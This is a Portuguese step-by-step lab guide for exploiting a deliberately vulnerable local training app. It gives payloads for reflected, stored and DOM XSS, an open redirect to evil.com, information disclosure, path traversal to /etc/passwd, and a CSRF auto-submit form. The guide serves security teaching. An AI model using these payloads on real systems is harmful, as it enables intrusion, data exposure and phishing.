# Passo a passo — Explorar Vulnerable Web

Guia específico para a app **vulnerable-web** do Security Lab. Use com `http://localhost:3001` rodando.

**Dica:** Acesse `/workshop.html` para fazer tudo **no lab mesmo** — página interativa com links "Testar" para cada vulnerabilidade.

---

## 1. Reflected XSS

| Item | Valor |
|------|-------|
| **Endpoint** | `GET /search?q=` |
| **Payload** | `<script>alert(1)</script>` |

**Passos:**
1. Acesse: `http://localhost:3001/search?q=teste`
2. Troque `teste` por: `<script>alert(1)</script>`
3. URL final: `http://localhost:3001/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E`
4. Se um popup com `1` aparecer → **vulnerável**

---

## 2. Stored XSS

| Item | Valor |
|------|-------|
| **Endpoints** | `POST /comment`, `GET /comments` |
| **Payload** | `<img src=x onerror=alert(1)>` |

**Passos:**
1. Acesse: `http://localhost:3001/comments`
2. No formulário, digite: `<img src=x onerror=alert(1)>`
3. Clique em **Submit**
4. Recarregue a página — o popup deve aparecer

---

## 3. DOM-based XSS

| Item | Valor |
|------|-------|
| **Endpoint** | `GET /dom-xss.html#` |
| **Payload** | `#<img src=x onerror=alert(1)>` |

**Passos:**
1. Acesse: `http://localhost:3001/dom-xss.html`
2. Na barra de URL, adicione: `#<img src=x onerror=alert(1)>`
3. URL final: `http://localhost:3001/dom-xss.html#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`
4. Se o popup aparecer → **vulnerável**

---

## 4. Open Redirect

| Item | Valor |
|------|-------|
| **Endpoint** | `GET /redirect?url=` |
| **Payload** | `?url=https://evil.com` |

**Passos:**
1. Acesse: `http://localhost:3001/redirect?url=https://example.com`
2. Você será redirecionado para example.com
3. Troque por `https://evil.com` para simular phishing

---

## 5. Information Disclosure — /debug

| Item | Valor |
|------|-------|
| **Endpoint** | `GET /debug` |

**Passos:**
1. Acesse: `http://localhost:3001/debug`
2. Veja o JSON com `admin_password`, variáveis de ambiente, versão do Node

---

## 6. Information Disclosure — Comentário HTML

| Item | Valor |
|------|-------|
| **Local** | Código-fonte de `index.html` |

**Passos:**
1. Acesse: `http://localhost:3001/`
2. Pressione `Ctrl+U` (ou Cmd+Option+U no Mac)
3. Procure: `<!-- Dev note: admin backup key is vweb_backup_2024 -->`

---

## 7. Path Traversal

| Item | Valor |
|------|-------|
| **Endpoint** | `GET /file?name=` |
| **Payload** | `?name=../../../etc/passwd` (Mac/Linux) |

**Passos:**
1. Acesse: `http://localhost:3001/file?name=../../../etc/passwd`
2. Se o conteúdo de `/etc/passwd` aparecer → **vulnerável**
3. Windows: tente `?name=..\..\..\..\Windows\System32\drivers\etc\hosts`

---

## 8. CSRF ausente

| Item | Valor |
|------|-------|
| **Endpoint** | `POST /comment` |

**Passos:**
1. Crie um arquivo HTML em outra pasta:
   ```html
   <form action="http://localhost:3001/comment" method="POST">
     <input name="comment" value="Comentário CSRF">
     <button type="submit">Enviar</button>
   </form>
   <script>document.forms[0].submit();</script>
   ```
2. Abra esse HTML (file://) com o lab rodando
3. O comentário é enviado sem token CSRF

---

## Resumo rápido

| # | Vulnerabilidade | URL para testar |
|---|-----------------|-----------------|
| 1 | Reflected XSS | `/search?q=<script>alert(1)</script>` |
| 2 | Stored XSS | `/comments` + enviar payload no form |
| 3 | DOM XSS | `/dom-xss.html#<img src=x onerror=alert(1)>` |
| 4 | Open Redirect | `/redirect?url=https://evil.com` |
| 5 | Info Disclosure | `/debug` |
| 6 | Info Disclosure | Ver fonte de `/` |
| 7 | Path Traversal | `/file?name=../../../etc/passwd` |
| 8 | CSRF | POST em `/comment` sem token |

---

**Workshop interativo:** `http://localhost:3001/workshop.html`
